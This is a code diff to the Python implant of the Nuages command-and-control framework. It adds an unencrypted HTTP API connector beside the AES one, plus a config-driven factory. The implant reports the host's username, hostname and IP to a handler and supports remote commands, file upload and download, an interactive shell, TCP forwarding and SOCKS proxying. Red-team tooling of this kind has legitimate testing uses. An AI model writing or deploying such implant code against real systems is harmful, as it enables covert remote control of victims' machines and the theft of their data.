@@ -74,12 +74,13 @@ class AESCipher(object):
     def _unpad(self, s):
         return self.pkcs7.decode(s)
 
-class NuagesConnector:
+class NuagesHttpAesConnector:
     def __init__(self, connectionString, key):
         # The URL of our handler
         self.connectionString = connectionString
         # The seed to generate our encryption keys
         self.aes = AESCipher(key)
+        self.handler_name = "HTTPAES256"
 
     def POST(self, url, data):
         encrypted_data = self.aes.encrypt(bytes(data, 'utf-8'))
@@ -90,51 +91,73 @@ class NuagesConnector:
 
         r = requests.post(self.connectionString, encrypted_data, headers=headers)
         if(r.status_code != 200):
-            raise Exception(r.status_code)            
+            raise Exception(r.status_code)
         if(len(r.content)>0):
             # The result must be decrypted
             return self.aes.decrypt(r.content).decode('utf-8')
         return ''
 
-    def POSTBIN(self, pipe_id, data):
-        # The target URL is generated
-        url = "bin/" + pipe_id
-        
-        # The data is encrypted
-        encrypted_data = self.aes.encrypt(data)
-
-        # The target URL is sent as Base64 in the Authorization header
-        encrypted_url = base64.b64encode(self.aes.encrypt(bytes(url, 'utf-8')))
-        
-        headers = {'Authorization': encrypted_url}
-
-        r = requests.post(self.connectionString, encrypted_data, headers=headers)
-        if(r.status_code != 200):
-            raise Exception(r.status_code)            
-        if(len(r.content)>0):
-            # The result must be decrypted
-            return self.aes.decrypt(r.content)
-        return ''
-
     def POSTBIN(self, pipe_id, data, maxSize):
         # The target URL is generated
         url = "bin/{}?max={}".format(pipe_id, maxSize)
-        
+
         # The data is encrypted
         encrypted_data = self.aes.encrypt(data)
 
         # The target URL is sent as Base64 in the Authorization header
         encrypted_url = base64.b64encode(self.aes.encrypt(bytes(url, 'utf-8')))
-        
+
         headers = {'Authorization': encrypted_url}
 
         r = requests.post(self.connectionString, encrypted_data, headers=headers)
         if(r.status_code != 200):
-            raise Exception(r.status_code)            
+            raise Exception(r.status_code)
         if(len(r.content)>0):
             # The result must be decrypted
             return self.aes.decrypt(r.content)
-        return ''
+        return b''
+
+
+class NuagesHttpApiConnector:
+    def __init__(self, connectionString):
+        # The URL of our HTTP API handler endpoint (for example: http://host:8080)
+        self.connectionString = connectionString.rstrip('/')
+        self.handler_name = "http/api"
+
+    def _build_url(self, target):
+        if self.connectionString.endswith('/implant'):
+            return self.connectionString + "/" + target.lstrip('/')
+        return self.connectionString + "/implant/" + target.lstrip('/')
+
+    def POST(self, url, data):
+        headers = {'Content-Type': 'application/json; charset=utf-8'}
+        r = requests.post(self._build_url(url), data=bytes(data, 'utf-8'), headers=headers)
+        if(r.status_code != 200):
+            raise Exception(r.status_code)
+        return r.text if len(r.text) > 0 else ''
+
+    def POSTBIN(self, pipe_id, data, maxSize):
+        url = "bin/{}?max={}".format(pipe_id, maxSize)
+        headers = {'Content-Type': 'application/octet-stream'}
+        payload = data if data is not None else b''
+        r = requests.post(self._build_url(url), data=payload, headers=headers)
+        if(r.status_code != 200):
+            raise Exception(r.status_code)
+        return r.content if len(r.content) > 0 else b''
+
+
+def create_connector(config):
+    connector_type = str(config.get("connector", "HTTPAES256")).upper()
+    connection_string = config.get("connectionString", "http://127.0.0.1:8888")
+
+    if connector_type == "HTTPAPI":
+        return NuagesHttpApiConnector(connection_string)
+
+    return NuagesHttpAesConnector(connection_string, config.get("password", "password"))
+
+
+# Backward-compatible alias for existing loader code.
+NuagesConnector = NuagesHttpAesConnector
 
 
 class NuagesImplant:
@@ -153,7 +176,7 @@ class NuagesImplant:
             self.username = os.getenv("LOGNAME")
         self.hostname = socket.gethostname()
         self.ip = socket.gethostbyname(self.hostname)
-        self.handler = "HTTPAES256"
+        self.handler = self.nuages.handler_name
         self.implantType = "Python"
         self.connectionString = self.nuages.connectionString
         self.supportedPayloads = ["cd", "command", "ls", "configure", "upload", "download", "interactive", "tcp_fwd", "socks", "exit"]
@@ -665,10 +688,13 @@ class NuagesImplant:
                 else:
                     pass
                 
-nuages = NuagesConnector("http://127.0.0.1:8888","password")
 config = {}
+config["connector"] = "HTTPAPI"
+config["connectionString"] = "http://127.0.0.1:8080"
+config["password"] = "password"
 config["sleep"] = "1"
 config["buffersize"] = "65536"
 config["refreshrate"] = "50"
+nuages = create_connector(config)
 implant = NuagesImplant(nuages, config)
 implant.start()
